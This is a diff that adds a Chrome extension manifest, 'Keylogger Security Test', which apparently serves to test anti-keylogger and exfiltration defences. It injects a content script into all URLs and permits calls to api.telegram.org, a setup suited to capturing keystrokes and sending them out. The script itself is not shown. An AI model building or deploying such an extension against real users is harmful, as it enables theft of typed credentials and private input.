@@ -1,0 +1,19 @@
+{
+  "manifest_version": 3,
+  "name": "Keylogger Security Test",
+  "version": "1.0.0",
+  "description": "Extension for testing anti-keylogger and exfiltration defenses.",
+  "permissions": [
+    "storage",
+    "activeTab"
+  ],
+  "host_permissions": [
+    "https://api.telegram.org/*"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"]
+    }
+  ]
+}
